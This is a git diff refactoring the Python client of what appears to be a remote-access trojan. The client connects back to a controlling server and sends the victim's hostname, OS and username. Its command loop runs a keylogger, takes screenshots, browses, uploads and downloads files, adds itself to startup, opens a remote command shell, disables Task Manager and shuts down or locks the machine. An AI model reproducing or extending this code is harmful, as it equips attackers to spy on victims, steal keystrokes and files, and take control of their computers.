@@ -27,7 +27,9 @@ while True:  # infinite loop until socket can connect
         time.sleep(5)  # wait 5 seconds to try again
     else: break
 
-objSocket.send(str.encode(socket.gethostname()))  # send computer name to server
+strUserInfo = socket.gethostname() + "`," + platform.system() + " " + platform.release() + "`," + os.environ["USERNAME"]
+objSocket.send(str.encode(strUserInfo))
+del strUserInfo  # delete data after it has been sent
 
 # function to return decoded utf-8
 decode_utf8 = lambda data: data.decode("utf-8")
@@ -78,11 +80,6 @@ def MessageBox(message):
     subprocess.Popen(["cscript", TMP + "/m.vbs"], shell=True)
 
 
-def msg(data):
-    strMsg = data[3:len(data)]
-    MessageBox(strMsg)
-
-
 def startup():
     try:
         strAppPath = APPDATA + "\\" + os.path.basename(strPath)
@@ -94,15 +91,6 @@ def startup():
         objSocket.send(str.encode("Unable to add to startup!"))
     else:
         objSocket.send(str.encode("success"))
-
-
-def info():
-    strOS = platform.system() + " " + platform.release()
-
-    strUser = os.environ["USERNAME"]
-
-    strInfo = "OS: " + strOS + "\n" + "Username: " + strUser + "\n"
-    objSocket.send(str.encode(strInfo))
 
 
 def screenshot():
@@ -118,21 +106,21 @@ def screenshot():
 
 
 def file_browser():
-    arRawDrives = win32api.GetLogicalDriveStrings()  # get list of drives
-    arRawDrives = arRawDrives.split('\000')[:-1]
+    arrRawDrives = win32api.GetLogicalDriveStrings()  # get list of drives
+    arrRawDrives = arrRawDrives.split('\000')[:-1]
 
     strDrives = ""
-    for drive in arRawDrives:  # get proper view and place array into string
+    for drive in arrRawDrives:  # get proper view and place array into string
         strDrives += drive.replace("\\", "") + "\n"
     objSocket.send(str.encode(strDrives))
 
-    strDir = objSocket.recv(1024).decode("utf-8")
+    strDir = decode_utf8(objSocket.recv(1024))
 
     if os.path.isdir(strDir):
-        arFiles = os.listdir(strDir)
+        arrFiles = os.listdir(strDir)
 
         strFiles = ""
-        for file in arFiles:
+        for file in arrFiles:
             strFiles += (file + "\n")
 
         objSocket.send(str.encode(str(len(strFiles))))  # send buffer size
@@ -147,7 +135,7 @@ def file_browser():
 def upload(data):
     intBuffer = int(data)
     file_data = recvall(intBuffer)
-    strOutputFile = objSocket.recv(1024).decode("utf-8")
+    strOutputFile = decode_utf8(objSocket.recv(1024))
 
     try:
         objFile = open(strOutputFile, "wb")
@@ -171,19 +159,13 @@ def receive(data):
     objFile.close()
 
 
-def shut_res_lock():
-    strChoice = objSocket.recv(1024).decode("utf-8")
+def lock():
+    ctypes.windll.user32.LockWorkStation()  # lock pc
 
-    if strChoice == "lock":
-        ctypes.windll.user32.LockWorkStation()  # lock pc
-        return
-    elif strChoice[3:7] == "none":
-        command = "shutdown " + strChoice[0:2] + " -f -t 0"
-        subprocess.Popen(command.split(), shell=True)
-    else:
-        command = ("shutdown " + strChoice[0:2] + " -f -t 10 -c").split()
-        command.append(strChoice[3:len(strChoice)])
-        subprocess.Popen(command, shell=True)
+
+def shutdown(shutdowntype):
+    command = "shutdown {0} -f -t 30".format(shutdowntype)
+    subprocess.Popen(command.split(), shell=True)
     objSocket.close()  # close connection and exit
     sys.exit(0)
 
@@ -194,7 +176,7 @@ def command_shell():
     objSocket.send(str.encode(strCurrentDir))
 
     while True:
-        strData = objSocket.recv(1024).decode("utf-8")
+        strData = decode_utf8(objSocket.recv(1024))
 
         if strData == "goback":
             os.chdir(strCurrentDir)  # change directory back to original
@@ -355,23 +337,25 @@ try:
             keylogger("stop")
             sys.exit(0)
         elif strData[:3] == "msg":
-            msg(strData)
+            MessageBox(strData[3:])
         elif strData[:4] == "site":
-            webbrowser.get().open(strData[4:len(strData)])
+            webbrowser.get().open(strData[4:])
         elif strData == "startup":
             startup()
-        elif strData == "info":
-            info()
         elif strData == "screen":
             screenshot()
         elif strData == "filebrowser":
             file_browser()
         elif strData[:4] == "send":
-            upload(strData[4:len(strData)])
+            upload(strData[4:])
         elif strData[:4] == "recv":
-            receive(strData[4:len(strData)])
-        elif strData == "shutreslock":
-            shut_res_lock()
+            receive(strData[4:])
+        elif strData == "lock":
+            lock()
+        elif strData == "shutdown":
+            shutdown("-s")
+        elif strData == "restart":
+            shutdown("-r")
         elif strData == "test":
             continue
         elif strData == "cmd":
@@ -385,7 +369,7 @@ try:
         elif strData == "keydump":
             keylogger("dump")
         elif strData[:6] == "runcmd":
-            run_command(strData[6:len(strData)])
+            run_command(strData[6:])
         elif strData == "dtaskmgr":
             if not "blnDisabled" in globals():  # if the variable doesnt exist yet
                 blnDisabled = "True"
